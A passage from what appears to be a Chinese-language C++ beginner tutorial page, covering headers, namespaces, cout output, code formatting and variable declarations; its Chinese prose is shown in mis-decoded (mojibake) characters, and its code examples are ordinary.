<code>iostream</code> æ–‡ä»¶ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // åŒ…å« iostream æ–‡ä»¶ï¼Œä»¥ä¾¿ä½¿ç”¨ cout</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from iostream!&quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>#include &lt;iostream&gt;</code>: è¿™æ¡æŒ‡ä»¤å‘Šè¯‰é¢„å¤„ç†å™¨æŸ¥æ‰¾åä¸º <code>iostream</code> çš„æ ‡å‡†å¤´æ–‡ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹æ’å…¥åˆ°è¯¥æŒ‡ä»¤æ‰€åœ¨çš„ä½ç½®ã€‚</li></ul><h3 id="2-1-4-å¤´æ–‡ä»¶å"><a href="#2-1-4-å¤´æ–‡ä»¶å" class="headerlink" title="2.1.4 å¤´æ–‡ä»¶å"></a>2.1.4 å¤´æ–‡ä»¶å</h3><p>å¤´æ–‡ä»¶ï¼ˆHeader Filesï¼‰åŒ…å«äº†å‡½æ•°ã€ç±»ã€å¯¹è±¡ç­‰çš„å£°æ˜ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºä¸­ä½¿ç”¨å®ƒä»¬ã€‚C++æ ‡å‡†åº“æä¾›äº†è®¸å¤šå¤´æ–‡ä»¶ã€‚</p><ul><li>  <strong>æ ‡å‡†åº“å¤´æ–‡ä»¶:</strong> é€šå¸¸ä½¿ç”¨å°–æ‹¬å· <code>&lt;&gt;</code> æ‹¬èµ·æ¥ï¼Œä¾‹å¦‚ <code>&lt;iostream&gt;</code>, <code>&lt;cmath&gt;</code>, <code>&lt;string&gt;</code>ã€‚ç¼–è¯‘å™¨ä¼šåœ¨æ ‡å‡†åº“çš„åŒ…å«è·¯å¾„ä¸­æŸ¥æ‰¾è¿™äº›æ–‡ä»¶ã€‚</li><li>  <strong>ç”¨æˆ·è‡ªå®šä¹‰å¤´æ–‡ä»¶:</strong> é€šå¸¸ä½¿ç”¨åŒå¼•å· <code>&quot;&quot;</code> æ‹¬èµ·æ¥ï¼Œä¾‹å¦‚ <code>&quot;myheader.h&quot;</code>ã€‚ç¼–è¯‘å™¨ä¼šé¦–å…ˆåœ¨å½“å‰æºæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æŸ¥æ‰¾ï¼Œç„¶ååœ¨æ ‡å‡†åŒ…å«è·¯å¾„ä¸­æŸ¥æ‰¾ã€‚</li></ul><p><strong>C++98ä¹‹å‰çš„å¤´æ–‡ä»¶:</strong> ä»¥å‰çš„C++å¤´æ–‡ä»¶å¯èƒ½å¸¦æœ‰ <code>.h</code> åç¼€ï¼ˆå¦‚ <code>&lt;iostream.h&gt;</code>ï¼‰ã€‚ç°ä»£C++ï¼ˆC++98åŠä»¥åï¼‰æ¨èä½¿ç”¨ä¸å¸¦ <code>.h</code> åç¼€çš„æ ‡å‡†å¤´æ–‡ä»¶ï¼ˆå¦‚ <code>&lt;iostream&gt;</code>ï¼‰ï¼Œè¿™äº›å¤´æ–‡ä»¶çš„å†…å®¹ä½äº <code>std</code> å‘½åç©ºé—´ä¸­ã€‚</p><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // æ ‡å‡†åº“å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;    // åŒ…å«æ•°å­¦å‡½æ•°ï¼Œå¦‚ sqrt()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;myutils.h&quot;</span> <span class="comment">// ç”¨æˆ·è‡ªå®šä¹‰å¤´æ–‡ä»¶ (å‡è®¾å­˜åœ¨ myutils.h)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> num = <span class="number">9.0</span>;</span><br><span class="line">    <span class="keyword">double</span> root = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(num); <span class="comment">// ä½¿ç”¨ cmath ä¸­çš„ sqrt å‡½æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Square root of &quot;</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; root &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å‡è®¾ myutils.h ä¸­å®šä¹‰äº† printMessage() å‡½æ•°</span></span><br><span class="line">    <span class="comment">// printMessage(&quot;Using custom header!&quot;); </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-5-åç§°ç©ºé—´"><a href="#2-1-5-åç§°ç©ºé—´" class="headerlink" title="2.1.5 åç§°ç©ºé—´"></a>2.1.5 åç§°ç©ºé—´</h3><p>åç§°ç©ºé—´ï¼ˆNamespaceï¼‰æ˜¯C++ä¸­é¿å…å‘½åå†²çªçš„ä¸€ç§æœºåˆ¶ã€‚ä¸åŒçš„åç§°ç©ºé—´å¯ä»¥åŒ…å«åŒåçš„å‡½æ•°ã€ç±»æˆ–å˜é‡ã€‚</p><p>æ ‡å‡†C++åº“ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ˆå¦‚ <code>cout</code>, <code>cin</code>, <code>endl</code>, <code>string</code> ç­‰ï¼‰éƒ½å®šä¹‰åœ¨åä¸º <code>std</code> çš„åç§°ç©ºé—´ä¸­ã€‚</p><p>è¦ä½¿ç”¨ <code>std</code> åç§°ç©ºé—´ä¸­çš„å…ƒç´ ï¼Œæœ‰å‡ ç§æ–¹æ³•ï¼š</p><ol><li><strong>ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code>:</strong> åœ¨æ¯ä¸ªå…ƒç´ å‰åŠ ä¸Š <code>std::</code>ã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ <code>using</code> å£°æ˜:</strong> å°†ç‰¹å®šçš„åç§°å¼•å…¥å½“å‰ä½œç”¨åŸŸã€‚ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>; <span class="comment">// åªå¼•å…¥ cout</span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// åªå¼•å…¥ endl</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// ä¸éœ€è¦ std:: å‰ç¼€</span></span><br><span class="line">    <span class="comment">// std::cin &gt;&gt; variable; // å¦‚æœè¦ç”¨ cinï¼Œä»éœ€ std:: æˆ– using std::cin;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ <code>using</code> ç¼–è¯‘æŒ‡ä»¤:</strong> å°†æ•´ä¸ªåç§°ç©ºé—´çš„æ‰€æœ‰åç§°å¼•å…¥å½“å‰ä½œç”¨åŸŸã€‚<strong>ï¼ˆä¸æ¨èåœ¨å¤´æ–‡ä»¶ä¸­æˆ–å…¨å±€ä½œç”¨åŸŸä¸­ä½¿ç”¨ï¼Œå¯èƒ½å¯¼è‡´å‘½åå†²çªï¼‰</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; <span class="comment">// å¼•å…¥ std ä¸­çš„æ‰€æœ‰åç§°</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// ä¸éœ€è¦ std:: å‰ç¼€</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x; <span class="comment">// cin ä¹Ÿä¸éœ€è¦ std:: å‰ç¼€</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>æ¨èåšæ³•:</strong></p><ul><li>  åœ¨ <code>.cpp</code> æ–‡ä»¶çš„å‡½æ•°å†…éƒ¨æˆ–è¾ƒå°ä½œç”¨åŸŸå†…ï¼Œå¯ä»¥ä½¿ç”¨ <code>using</code> å£°æ˜æˆ– <code>using namespace std;</code>ã€‚</li><li>  åœ¨å¤´æ–‡ä»¶ (<code>.h</code>) ä¸­ï¼Œ<strong>ç»å¯¹ä¸è¦</strong>ä½¿ç”¨ <code>using namespace std;</code>ï¼Œåº”å§‹ç»ˆä½¿ç”¨ <code>std::</code> å‰ç¼€ã€‚</li><li>  åœ¨ç®€å•çš„ç¤ºä¾‹æˆ–å°å‹é¡¹ç›®ä¸­ï¼Œ<code>using namespace std;</code> å¯ä»¥ç®€åŒ–ä»£ç ï¼Œä½†åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼ŒåšæŒä½¿ç”¨ <code>std::::</code> æˆ– <code>using</code> å£°æ˜æ˜¯æ›´å®‰å…¨çš„åšæ³•ã€‚</li></ul><h3 id="2-1-6-ä½¿ç”¨coutè¿›è¡ŒC-è¾“å‡º"><a href="#2-1-6-ä½¿ç”¨coutè¿›è¡ŒC-è¾“å‡º" class="headerlink" title="2.1.6 ä½¿ç”¨coutè¿›è¡ŒC++è¾“å‡º"></a>2.1.6 ä½¿ç”¨coutè¿›è¡ŒC++è¾“å‡º</h3><p><code>cout</code> æ˜¯ <code>iostream</code> åº“ä¸­é¢„å®šä¹‰çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä»£è¡¨æ ‡å‡†è¾“å‡ºæµï¼Œé€šå¸¸è¿æ¥åˆ°æ§åˆ¶å°ï¼ˆå±å¹•ï¼‰ã€‚</p><p><code>&lt;&lt;</code> è¿ç®—ç¬¦ï¼ˆæ’å…¥è¿ç®—ç¬¦ï¼‰ç”¨äºå°†æ•°æ®å‘é€ç»™ <code>cout</code> å¯¹è±¡ï¼Œä½¿å…¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è¾“å‡ºå­—ç¬¦ä¸²å­—é¢é‡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Welcome to C++!&quot;</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è¾“å‡ºæ¢è¡Œç¬¦ (ä½¿ç”¨ std::endl)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è¾“å‡ºæ•°å­—</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The year is &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="number">2024</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é“¾å¼è¾“å‡º</span></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">30</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My age is: &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºç‰¹æ®Šå­—ç¬¦ (ä½¿ç”¨è½¬ä¹‰åºåˆ—)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a tab:\t.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a newline:\n.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a quote: \&quot; &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a backslash: \\&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>std::endl</code>: æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ§åˆ¶ç¬¦ï¼ˆmanipulatorï¼‰ï¼Œå®ƒä¼šè¾“å‡ºä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå¹¶<strong>åˆ·æ–°è¾“å‡ºç¼“å†²åŒº</strong>ï¼ˆç¡®ä¿å†…å®¹ç«‹å³æ˜¾ç¤ºï¼‰ã€‚</li><li>  <code>\n</code>: æ˜¯ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ï¼Œä»£è¡¨æ¢è¡Œç¬¦ã€‚å®ƒåªè¾“å‡ºæ¢è¡Œï¼Œé€šå¸¸ä¸ä¿è¯ç«‹å³åˆ·æ–°ç¼“å†²åŒºã€‚åœ¨å¤šæ•°æƒ…å†µä¸‹ï¼Œ<code>\n</code> æ¯” <code>std::endl</code> æ•ˆç‡ç¨é«˜ã€‚</li></ul><h3 id="2-1-7-C-æºä»£ç çš„æ ¼å¼åŒ–"><a href="#2-1-7-C-æºä»£ç çš„æ ¼å¼åŒ–" class="headerlink" title="2.1.7 C++æºä»£ç çš„æ ¼å¼åŒ–"></a>2.1.7 C++æºä»£ç çš„æ ¼å¼åŒ–</h3><p>C++è¯­è¨€å¯¹ä»£ç æ ¼å¼ï¼ˆå¦‚ç©ºæ ¼ã€ç¼©è¿›ã€æ¢è¡Œï¼‰çš„è¦æ±‚ç›¸å¯¹å®½æ¾ï¼Œä½†è‰¯å¥½çš„æ ¼å¼åŒ–å¯¹äºä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§è‡³å…³é‡è¦ã€‚</p><p><strong>åŸºæœ¬è§„åˆ™å’Œå»ºè®®:</strong></p><ul><li>  <strong>è¯­å¥åˆ†éš”:</strong> C++ä½¿ç”¨åˆ†å· <code>;</code> æ¥ç»“æŸå¤§å¤šæ•°è¯­å¥ã€‚</li><li><strong>ç©ºæ ¼:</strong><ul><li>  é€šå¸¸åœ¨è¿ç®—ç¬¦ï¼ˆ<code>=</code>, <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>==</code> ç­‰ï¼‰ä¸¤è¾¹æ·»åŠ ç©ºæ ¼ã€‚</li><li>  åœ¨é€—å· <code>,</code> åé¢æ·»åŠ ç©ºæ ¼ã€‚</li><li>  åœ¨å‡½æ•°åå’Œåé¢çš„æ‹¬å· <code>()</code> ä¹‹é—´é€šå¸¸ä¸åŠ ç©ºæ ¼ã€‚</li></ul></li><li>  <strong>ç¼©è¿›:</strong> ä½¿ç”¨ä¸€è‡´çš„ç¼©è¿›ï¼ˆé€šå¸¸æ˜¯4ä¸ªç©ºæ ¼æˆ–ä¸€ä¸ªåˆ¶è¡¨ç¬¦ï¼‰æ¥è¡¨ç¤ºä»£ç å—ï¼ˆå¦‚ <code>main</code> å‡½æ•°ä½“ã€å¾ªç¯ä½“ã€æ¡ä»¶è¯­å¥ä½“ï¼‰ã€‚è¿™æå¤§åœ°æé«˜äº†ä»£ç ç»“æ„çš„å¯è¯»æ€§ã€‚</li><li><strong>æ¢è¡Œ:</strong><ul><li>  é€šå¸¸æ¯è¡Œåªå†™ä¸€æ¡è¯­å¥ã€‚</li><li>  å¯ä»¥åœ¨åˆé€‚çš„åœ°æ–¹ï¼ˆå¦‚è¿ç®—ç¬¦ä¹‹åã€é€—å·ä¹‹åï¼‰å°†é•¿è¯­å¥åˆ†æˆå¤šè¡Œã€‚</li></ul></li><li>  <strong>èŠ±æ‹¬å· <code>&#123;&#125;</code>:</strong> å¯¹äºä»£ç å—ï¼ˆå¦‚å‡½æ•°ä½“ã€<code>if</code> è¯­å¥å—ç­‰ï¼‰ï¼ŒèŠ±æ‹¬å·çš„æ”¾ç½®é£æ ¼æœ‰å¤šç§ï¼ˆå¦‚ K&amp;R é£æ ¼ã€Allman é£æ ¼ï¼‰ï¼Œé€‰æ‹©ä¸€ç§å¹¶ä¿æŒä¸€è‡´å³å¯ã€‚</li></ul><p><strong>ç¤ºä¾‹ (è‰¯å¥½æ ¼å¼):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// å·¦èŠ±æ‹¬å·é€šå¸¸ç‹¬å ä¸€è¡Œæˆ–åœ¨è¡Œå°¾</span></span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &gt; <span class="number">90</span>) </span><br><span class="line">    &#123; <span class="comment">// ç¼©è¿›è¡¨ç¤º if å—å†…éƒ¨</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Excellent!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        score = score + <span class="number">5</span>; <span class="comment">// åœ¨è¿ç®—ç¬¦ä¸¤è¾¹åŠ ç©ºæ ¼</span></span><br><span class="line">    &#125; <span class="comment">// å³èŠ±æ‹¬å·é€šå¸¸ç‹¬å ä¸€è¡Œï¼Œä¸å¯¹åº”å—çš„èµ·å§‹å¯¹é½</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ (ä¸è‰¯æ ¼å¼ï¼Œä½†è¯­æ³•æ­£ç¡®):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;<span class="keyword">int</span> score=<span class="number">100</span>;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Initial score: &quot;</span>&lt;&lt;score&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;<span class="keyword">if</span>(score&gt;<span class="number">90</span>)&#123;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Excellent!&quot;</span>&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;score=score+<span class="number">5</span>;&#125;<span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Final score: &quot;</span>&lt;&lt;score&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶ç¬¬äºŒä¸ªç¤ºä¾‹ä¹Ÿèƒ½ç¼–è¯‘è¿è¡Œï¼Œä½†æéš¾é˜…è¯»å’Œç†è§£ã€‚éµå¾ªä¸€è‡´çš„ã€æ¸…æ™°çš„æ ¼å¼åŒ–é£æ ¼æ˜¯ä¸“ä¸šç¼–ç¨‹çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚</p><h2 id="2-2-C-è¯­å¥"><a href="#2-2-C-è¯­å¥" class="headerlink" title="2.2 C++è¯­å¥"></a>2.2 C++è¯­å¥</h2><p>C++ç¨‹åºç”±ä¸€ç³»åˆ—è¯­å¥ç»„æˆã€‚è¯­å¥æ˜¯C++ç¨‹åºçš„åŸºæœ¬æ‰§è¡Œå•å…ƒï¼Œé€šå¸¸ä»¥åˆ†å· <code>;</code> ç»“å°¾ã€‚æœ¬èŠ‚å°†ä»‹ç»ä¸¤ç§åŸºæœ¬çš„è¯­å¥ï¼šå£°æ˜è¯­å¥å’Œèµ‹å€¼è¯­å¥ï¼Œå¹¶è¿›ä¸€æ­¥æ¢è®¨ <code>cout</code> çš„ç”¨æ³•ã€‚</p><h3 id="2-2-1-å£°æ˜è¯­å¥å’Œå˜é‡"><a href="#2-2-1-å£°æ˜è¯­å¥å’Œå˜é‡" class="headerlink" title="2.2.1 å£°æ˜è¯­å¥å’Œå˜é‡"></a>2.2.1 å£°æ˜è¯­å¥å’Œå˜é‡</h3><p><strong>å£°æ˜è¯­å¥ (Declaration Statement)</strong> ç”¨äºå‘ç¼–è¯‘å™¨å£°æ˜ç¨‹åºä¸­å°†è¦ä½¿ç”¨çš„<strong>å˜é‡ (Variable)</strong> çš„åç§°å’Œç±»å‹ã€‚</p><p><strong>å˜é‡</strong> æ˜¯è®¡ç®—æœºå†…å­˜ä¸­ç”¨äºå­˜å‚¨æ•°æ®çš„ä¸€å—åŒºåŸŸï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªåå­—ï¼ˆæ ‡è¯†ç¬¦ï¼‰ã€‚é€šè¿‡å˜é‡åï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®å’Œä¿®æ”¹å­˜å‚¨åœ¨å†…å­˜ä¸­çš„æ•°æ®ã€‚åœ¨ä½¿ç”¨å˜é‡ä¹‹å‰ï¼Œå¿…é¡»å…ˆå£°æ˜å®ƒã€‚</p><p><strong>å£°æ˜å˜é‡çš„è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName variableName; </span><br></pre></td></tr></table></figure><ul><li>  <code>typeName</code>: æŒ‡å®šå˜é‡è¦å­˜å‚¨çš„æ•°æ®ç±»å‹ï¼ˆä¾‹å¦‚ <code>int</code> è¡¨ç¤ºæ•´æ•°ï¼Œ<code>double</code> è¡¨ç¤ºæµ®ç‚¹æ•°ï¼‰ã€‚</li><li>  <code>variableName</code>: ä½ ä¸ºå˜é‡é€‰æ‹©çš„åç§°ï¼ˆæ ‡è¯†ç¬¦ï¼‰ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜ä¸€ä¸ªåä¸º carrots çš„æ•´å‹å˜é‡</span></span><br><span class="line">    <span class="keyword">int</span> carrots; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜å¤šä¸ªåŒç±»å‹çš„å˜é‡</span></span><br><span class="line">    <span class="keyword">int</span> dogs, cats; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜å¹¶åŒæ—¶åˆå§‹åŒ–å˜é‡ (èµ‹åˆå€¼)</span></span><br><span class="line">    <span class="keyword">int</span> fleas = <span class="number">10</span>; </span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ– (æ›´æ¨è)</span></span><br><span class="line">    <span class="keyword">int</span> hamsters = &#123;<span class="number">5</span>&#125;; </span><br><span class="line">    <span class="keyword">int</span> gerbils&#123;<span class="number">8</span>&#125;; <span class="comment">// èŠ±æ‹¬å·å¯ä»¥çœç•¥ç­‰å·</span></span><br><span class="line">    <span class="keyword">int</span> rats&#123;&#125;;     <span class="comment">// åˆå§‹åŒ–ä¸º 0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... åç»­å¯ä»¥ä½¿ç”¨è¿™äº›å˜é‡ ...</span></span><br><span class="line"></span><br><span class="line">    